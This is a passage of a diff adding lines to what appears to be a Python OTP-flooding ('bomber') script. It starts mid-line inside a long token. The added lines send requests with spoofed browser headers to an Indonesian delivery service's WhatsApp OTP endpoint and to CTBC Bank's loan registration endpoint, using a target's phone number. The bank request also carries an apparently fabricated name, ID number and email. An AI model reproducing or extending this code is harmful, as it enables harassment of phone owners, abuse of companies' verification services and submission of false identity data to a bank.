33mKM48AD4uxIuFoXPtgl0ILxe_oVTPuQ20J809SjzVEO_ssqqxrWxgDcbYLkN-0les80DU0xFppAt0ZAcUODeeWjgcz1SwDVQvjUhycxxz6L7Q7MoQmFR5WB2Sl7vardSIu09m3dW18rzJ3pc6GDCBzEBklVKQjGlg9O3V7S4TLgu5n8BH7cpvWaq39gHXs6t-j4ZEuNRef_F5QPzuv3Yc0QfNohglwJDmZDuTgnJDM3YMrVN8WkCf9EW9PszF_-WHE59D1Kp5j1LZUo86Sb1xTGwjrrjGM1KA3BkThqXreaIf4lpqk99BNEvg1Wk4NLAR3lm8rUmD0bMz4txm2SPW7IKIZ6LMEpUDDEHb3cKUYrtHSGp962F_gnYwuNtK3RvPLbsJIgtlhXjmKFHzPmjCADQ607kOENsLkh-mOhHIK2Z5gTfky7yhVE6ho62-xxniKMk4zvAYqpN10OppxnuEINtgG2H3SddTgiK8E1cD8T4--hNPGoH8-87l-CiDEzxJLvGo-yhvYeduGB4GpseXq58cxUab08fY_Um68fi53uiM1AtN80h90MwDUAZJZhbmOSr27KiISkCJa9Oqi38Qh6pJz24IEsjDq4bdv4t8Dp7SCxidKgHqZgcV6nMAoHaWUkXAVY-Vd8IhwRZpWqEeA7nsirh-leAoIW7fpO2AKhuyNEyCJK8juqpHwGOCvELyZxo0dghH5uPnRA-NT1QNMAoLIm1f_Utgfwy9a6ramuWPDNCOm89EHNbdZ4NSy7hqnhY2g2TA5fDZusx-WjqjNX7zFEJSf8sJeDBzPGnx4KkGQ2ZlL7XW8GGXnALf5ZBDVRoCc7hbaD0J8w"})).text
+            astro=requests.post("https://api.astronauts.id/api/otp/generate_wa",headers={"Host": "api.astronauts.id","content-length": "24","x-device-version": "v2.0.29","x-api-version": "1.9.4","sec-ch-ua-mobile": "?1","authorization": "","access-control-max-age": "7200","content-type": "application/json","accept": "application/json, text/plain, */*","user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36","x-device": "web-customer","sec-ch-ua-platform": '"Android"',"origin": "https://www.astronauts.id","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://www.astronauts.id/","accept-encoding": "gzip, deflate, br, zstd","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phone":"0"+nomor})).text
+            ctb=requests.post("https://eloan.ctbcbank.co.id/danacinta/cust/register/customer",headers={"Host": "eloan.ctbcbank.co.id","Connection": "keep-alive","Content-Length": "353","Cache-Control": "max-age=0","sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',"sec-ch-ua-platform": '"Android"',"sec-ch-ua-mobile": "?1","User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36","Content-Type": "application/json","Accept": "*/*","Origin": "https://eloan.ctbcbank.co.id","Sec-Fetch-Site": "same-origin","Sec-Fetch-Mode": "cors","Sec-Fetch-Dest": "empty","Accept-Encoding": "gzip, deflate, br, zstd","Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"ktpName":"Muwani ireng","ktpId":"9165820977887889","dateOfBirth":"1988-01-09","email":"dixa83dixa9@gmail.com","mobilePhone":nomor,"areaCoverageCity":"Tangerang\r\n","isAgreePersonInfo":"1","isAgreeTncpp":"1","deviceId":null,"digitalCampaign":null,"gclid":null,"utmSource":null,"utmMedium":"homepage1","utmCampaign":null,"utmContent":null,"gacId":null})).text
